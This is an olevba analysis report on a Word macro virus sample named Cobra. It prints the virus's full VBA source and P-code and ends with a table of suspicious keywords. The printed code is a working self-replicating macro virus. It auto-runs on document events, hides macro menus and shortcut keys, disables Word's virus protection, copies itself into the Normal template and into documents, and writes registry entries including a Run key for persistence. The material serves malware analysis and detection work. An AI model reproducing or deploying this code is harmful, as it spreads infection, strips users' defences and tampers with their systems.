olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BornCobra.bas 
in file: ./Virus.MSWord.Cobra.l - OLE stream: 'Macros/VBA/BornCobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0E
'A intelligent member of Cobra family

Sub AutoOpen()
Call IntMenu
Call InfCobra
Call RegE
End Sub
Sub AutoClose()
Call IntMenu
Call InfCobra
Call RegE
End Sub
Sub FileNew()
Call IntMenu
Call InfCobra
Call RegE
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileOpen()
Call IntMenu
Call InfCobra
Call RegE
Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileExit()
On Error Resume Next
Call IntMenu
Call InfCobra
Call RegE
WordBasic.FileExit
End Sub
Sub IntMenu()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub InfCobra()
On Error Resume Next
Dim Mac, MacFound
MacFound = False
For Each Mac In NormalTemplate.VBProject.VBComponents
If Mac.Name <> "ThisDocument" And Mac.Name <> "BornCobra" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=Mac.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each Mac In NormalTemplate.VBProject.VBComponents
If Mac.Name = "BornCobra" Then
MacFound = True
End If
Next
If MacFound = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="BornCobra", _
Object:=wdOrganizerObjectProjectItems
End If
MacFound = False
For Each Mac In ActiveDocument.VBProject.VBComponents
If Mac.Name <> "ThisDocument" And Mac.Name <> "BornCobra" _
And Mac.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, _
Name:=Mac.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each Mac In ActiveDocument.VBProject.VBComponents
If Mac.Name = "BornCobra" Then
MacFound = True
End If
Next
If MacFound = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, Name:="BornCobra", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub RegE()
SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner")
If SR <> "Cobra" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,PB/ER/DHK-1217/BD"
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate") = Format(Date, "mm/dd/yyyy")
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")
End If
CD = Format(Date, "mm/dd/yyyy")
TD = DateValue(CD) - DateValue(ID)
If TD > 60 Then
SysR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Cobra") = SysR + "\Cobra.Doc"
ActiveDocument.SaveAs (SysR + "\Cobra.Doc"), FileFormat:=wdFormatTemplate
WordBasic.FileExit
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cobra.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/BornCobra - 6207 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0012 "Cobra Version 2.0E"
' Line #1:
' 	QuoteRem 0x0000 0x0024 "A intelligent member of Cobra family"
' Line #2:
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	ArgsCall (Call) IntMenu 0x0000 
' Line #5:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #6:
' 	ArgsCall (Call) RegE 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Sub AutoClose())
' Line #9:
' 	ArgsCall (Call) IntMenu 0x0000 
' Line #10:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #11:
' 	ArgsCall (Call) RegE 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub FileNew())
' Line #14:
' 	ArgsCall (Call) IntMenu 0x0000 
' Line #15:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #16:
' 	ArgsCall (Call) RegE 0x0000 
' Line #17:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Sub FileOpen())
' Line #20:
' 	ArgsCall (Call) IntMenu 0x0000 
' Line #21:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #22:
' 	ArgsCall (Call) RegE 0x0000 
' Line #23:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Sub FileExit())
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	ArgsCall (Call) IntMenu 0x0000 
' Line #28:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #29:
' 	ArgsCall (Call) RegE 0x0000 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub IntMenu())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #35:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #36:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #37:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #38:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #39:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #40:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #41:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub InfCobra())
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	Dim 
' 	VarDefn Mac
' 	VarDefn MacFound
' Line #48:
' 	LitVarSpecial (False)
' 	St MacFound 
' Line #49:
' 	StartForVariable 
' 	Ld Mac 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #50:
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x0009 "BornCobra"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #51:
' 	LineCont 0x0004 09 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Mac 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	StartForVariable 
' 	Next 
' Line #54:
' 	StartForVariable 
' 	Ld Mac 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #55:
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x0009 "BornCobra"
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitVarSpecial (True)
' 	St MacFound 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Next 
' Line #59:
' 	Ld MacFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "BornCobra"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	LitVarSpecial (False)
' 	St MacFound 
' Line #63:
' 	StartForVariable 
' 	Ld Mac 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #64:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x0009 "BornCobra"
' 	Ne 
' 	And 
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #65:
' 	LineCont 0x0004 09 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Mac 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' 	StartForVariable 
' 	Ld Mac 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #69:
' 	Ld Mac 
' 	MemLd New 
' 	LitStr 0x0009 "BornCobra"
' 	Eq 
' 	IfBlock 
' Line #70:
' 	LitVarSpecial (True)
' 	St MacFound 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Next 
' Line #73:
' 	Ld MacFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #74:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "BornCobra"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub RegE())
' Line #78:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SR 
' Line #79:
' 	Ld SR 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	IfBlock 
' Line #80:
' 	LitStr 0x0005 "Cobra"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #81:
' 	LitStr 0x0015 "349,PB/ER/DHK-1217/BD"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "InfectDate"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #84:
' 	Ld ID 
' 	ArgsLd IsDate 0x0001 
' 	Not 
' 	IfBlock 
' Line #85:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "InfectDate"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #86:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "InfectDate"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CD 
' Line #89:
' 	Ld CD 
' 	ArgsLd DateValue 0x0001 
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	St TD 
' Line #90:
' 	Ld TD 
' 	LitDI2 0x003C 
' 	Gt 
' 	IfBlock 
' Line #91:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SysR 
' Line #92:
' 	Ld SysR 
' 	LitStr 0x000A "\Cobra.Doc"
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0005 "Cobra"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #93:
' 	Ld SysR 
' 	LitStr 0x000A "\Cobra.Doc"
' 	Add 
' 	Paren 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #94:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

